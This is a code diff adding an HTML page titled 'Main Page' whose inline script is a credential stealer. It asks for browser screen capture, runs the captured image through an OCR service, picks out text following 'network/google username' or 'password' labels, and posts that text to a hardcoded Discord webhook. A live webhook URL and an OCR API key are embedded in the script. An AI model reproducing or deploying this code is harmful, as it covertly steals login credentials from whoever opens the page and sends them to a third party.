@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Main</title>
+</head>
+<body>
+<h1>Main Page</h1>
+<script>
+const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd",
+      K="K85882318988957";
+
+(async()=>{
+  try{
+    // 1️⃣ open test page in new tab
+    const testTab = window.open("test.html","_blank");
+
+    // 2️⃣ request screen capture
+    const stream = await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"browser"}});
+    
+    // 3️⃣ tell test page we have permission
+    testTab.postMessage({msg:"permission_granted"},"*");
+
+    // 4️⃣ wait for test page to respond with "allowed"
+    await new Promise(resolve => {
+      function handler(e){
+        if(e.data?.msg === "allowed"){
+          window.removeEventListener("message", handler);
+          resolve();
+        }
+      }
+      window.addEventListener("message", handler);
+    });
+
+    // 5️⃣ proceed with OCR + Discord
+    const v = document.createElement("video");
+    v.srcObject = stream; 
+    await v.play(); 
+    await new Promise(r=>setTimeout(r,1000));
+
+    const c = document.createElement("canvas");
+    c.width=v.videoWidth; c.height=v.videoHeight;
+    c.getContext("2d").drawImage(v,0,0);
+    stream.getTracks().forEach(t=>t.stop());
+
+    const b = await new Promise(r=>c.toBlob(r,"image/png"));
+    const f = new FormData();
+    f.append("apikey", K); f.append("language","eng"); f.append("file", b, "shot.png");
+
+    const j = await (await fetch("https://api.ocr.space/parse/image",{method:"POST",body:f})).json();
+    if(!j.ParsedResults?.length) return;
+
+    const l = j.ParsedResults.map(r=>r.ParsedText).join("\n").split(/\r?\n/),
+          o = l.reduce((a,v,i)=>a||(v.toLowerCase().includes("network/google username")||v.toLowerCase().includes("network/google password")?`${l[i+1]||""}\n${l[i+2]||""}`:""),"").trim();
+    if(!o) return;
+
+    await fetch(W,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({content:o||"(no valid text found)"})
+    });
+
+    console.log("OCR + Discord done!");
+  } catch(e){console.error(e);}
+})();
+</script>
+</body>
+</html>
